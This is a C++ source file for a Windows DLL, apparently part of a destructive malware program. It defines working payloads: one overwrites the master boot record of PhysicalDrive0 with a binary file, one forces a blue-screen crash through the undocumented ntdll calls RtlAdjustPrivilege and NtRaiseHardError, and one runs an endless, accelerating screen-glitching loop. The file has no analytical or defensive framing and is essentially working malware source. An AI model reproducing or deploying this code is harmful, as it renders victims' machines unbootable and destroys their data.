// Payloads.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "Payloads.h"

namespace Payloads
{
	void GetDesktopResolution(int& horizontal, int& vertical) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); horizontal = desktop.right; vertical = desktop.bottom; }

	void Payloads::MBR_Overwrite()
	{
		DWORD dw;
		LPCWSTR pathToBin = L"C:\\Windows\\data.bin";
		HANDLE drive = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		if (drive != INVALID_HANDLE_VALUE) {
			HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
			if (binary != INVALID_HANDLE_VALUE) {
				DWORD size = GetFileSize(binary, 0);
				if (size > 0) {
					BYTE *mbr = new BYTE[size];
					if (ReadFile(binary, mbr, size, &dw, 0)) {
						NULL;
						if (WriteFile(drive, mbr, size, &dw, 0)) {
							NULL;
						}
					}
				}
			}
			CloseHandle(binary);
		}
		CloseHandle(drive);
		_getch();
	}

	void Payloads::FORCE_BSOD()
	{
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {

			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN);
	}

	void Payloads::Screen_Glitching()
	{
		int Timer = 7500; int horizontal = 0; int vertical = 0; GetDesktopResolution(horizontal, vertical);

		while (true)
		{
			Sleep(Timer);
			srand(time(0));

			StretchBlt(GetDC(NULL), rand() % 15 + (15), rand() % 15 + (15), horizontal - rand() % 15 + (15), vertical - rand() % 15 + (15), GetDC(NULL), 0, 0, horizontal + rand() % 15 + (15), vertical + rand() % 15 + (15), SRCAND);
			StretchBlt(GetDC(NULL), rand() % 15 + (15), rand() % 15 + (15), horizontal - rand() % 15 + (15), vertical - rand() % 15 + (15), GetDC(NULL), 0, 0, horizontal + rand() % 15 + (15), vertical + rand() % 15 + (15), SRCPAINT);

			if (Timer > 750) { Timer -= 750; }
		}
	}
}
